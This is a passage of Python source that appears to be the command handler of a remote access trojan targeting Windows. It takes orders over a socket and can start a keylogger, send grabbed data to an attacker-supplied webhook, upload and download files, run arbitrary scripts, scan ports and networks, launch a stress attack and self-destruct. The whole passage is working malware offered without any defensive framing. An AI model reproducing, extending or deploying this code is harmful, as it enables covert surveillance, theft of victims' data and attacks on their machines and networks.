            elif "portscan" in data:
                try:
                    data = data.replace("pscan ","").split()
                    ipp = data[0]
                    starting_port = int(data[1])
                    ending_port = int(data[2])
                    thread_amount = int(data[3])

                    def _portscanner(ipp, starting_port, ending_port, thread_amount):
                        target = ipp
                        queue = Queue()
                        open_ports = []

                        def portscan(port):
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.connect((target, port))
                                return True
                            except:
                                return False

                        def get_ports(starting_port, ending_port): 
                            for port in range(starting_port, ending_port): queue.put(port)
                            
                        def worker():
                            while not queue.empty():
                                port = queue.get()
                                if portscan(port): open_ports.append(port)

                        def run_scanner(thread_amount, starting_port, ending_port):

                            get_ports(starting_port, ending_port)
                            thread_list = []

                            for t in range(thread_amount):
                                thread = threading.Thread(target=worker)
                                thread_list.append(thread)

                            for thread in thread_list: 
                                thread.start()
                            for thread in thread_list: 
                                thread.join()

                            return open_ports


                        return run_scanner(thread_amount, starting_port, ending_port)
                    
                    self.sock.send(str.encode(f"{ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "admincheck" in data:
                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "keylogger" in data:
                try: 
                    data = data.replace("keylogger ","").split()
                    intervals = int(data[0])
                    reciever = str(data[1])

                    threading.Thread(target=Keylogger(intervals, reciever).start).start()
                    self.sock.send(str.encode(f"Keylogger started"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "download" in data:
                try:
                    data = data.replace("download ","").split()
                    dir = str(data[0])
                    out = self.download(dir)
                    self.sock.send(str.encode(f"Download file: " + out))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "upload" in data:
                try:
                    data = data.replace("upload ","").split()
                    dir = str(data[0])
                    out = self.upload(dir)
                    self.sock.send(str.encode(f"File Uploaded: " + out))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "datagrabber" in data:
                try:
                    data = data.replace("datagrabber ","").split()
                    webhook___ = str(data[0])

                    # run datagrabber thread
                    threading.Thread(target=start_datagrabber, args=(webhook___, )).start()
                    self.sock.send(str.encode("Datagrabber Running"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "runscript" in data:
                try:
                    data = data.replace("runscript ","").split()
                    name_   = str(data[0])
                    type_   = str(data[1])
                    s_code  = data[2:]
                    code_   = " ".join(s_code)

                    threading.Thread(target=self.execute_script, args=(name_, type_, code_, )).start()
                    self.sock.send("Script executed".encode("ascii"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "stress" in data:
                try:
                    data    = data.replace("stress ","").split()
                    time    = int(data[0])
                    tasks   = int(data[1])

                    threading.Thread(target=start_stresser, args=(time, tasks, )).start()
                    self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "stopprocessscontrol":
                try:
                    blocked_process = []
                    process_control.stop = 6969
                    self.sock.send(f"Process Control Disabled".encode("ascii"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "systeminfo":
                try:
                    data = f""" System Information

                    
============================================================================================================================
============================================================================================================================


                              Network Info
            ---------------------------------------------------
                    Public IP:          {self.public_ip}
                    Local IP:           {IP_addres}
        


                            Current CPU Info
    ---------------------------------------------------------------------
        CPU Frequency:                  {psutil.cpu_freq().current}
        CPU Utilization:                {psutil.cpu_percent(interval=1)}
        Per-CPU Utilization:            {psutil.cpu_percent(interval=1, percpu=True)}
        Min CPU Frequency:              {psutil.cpu_freq().min}
        Max CPU Frequency:              {psutil.cpu_freq().max}

        Number of physical cores: {psutil.cpu_count(logical=False)}
        Number of logical cores:  {psutil.cpu_count(logical=True)}



                                RAM Info
    ---------------------------------------------------------------------
        Available RAM:                  {round(psutil.virtual_memory().available/1000000000, 2)} GB
        Used RAM:                       {round(psutil.virtual_memory().used/1000000000, 2)} GB
        RAM Usage:                      {psutil.virtual_memory().percent}%



                                OS Info
    ---------------------------------------------------------------------
        Machine Type:                   {platform.machine()}
        Processor Type:                 {platform.processor()}
        Platform Type:                  {platform.platform()}
        OS Type:                        {platform.system()}
        OS Release Version:             {platform.release()}
                    

============================================================================================================================
============================================================================================================================
"""
                    self.sock.send(str.encode(data))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "sendinfo":
                try:
                    self.sock.send(str.encode(f"{self.public_ip} {socket.gethostname()} {platform.system()} Online"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "selfdestruct":
                try:
                    self.sock.send(str.encode(f"{self.public_ip}    Self destructing..."))
                    self._self_destruct()
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "networkscan":
                try: self.sock.send(f"{self.public_ip}    {network_scan()}".encode("ascii"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "jigglecursor":
                try:
                    threading.Thread(target=cursor_jiggle, args=(420,)).start()
                    self.sock.send(str.encode("Jiggling Cursor Enabled"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "jigglecursorstop":
                try:
                    cursor_jiggle.stop = 420
                    self.sock.send(str.encode("Jiggling Cursor Disabled"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif data == "ping":
                self.sock.send(str.encode(f"pong"))

            else: self.sock.send(str.encode("Invalid Command"))


if __name__ == '__main__': 
    if platform.system() == 'Windows':
        try: httpx.get('https://google.com')
        except (httpx.NetworkError, httpx.TimeoutException): os._exit(1)
        Client()
    else: os._exit(1)
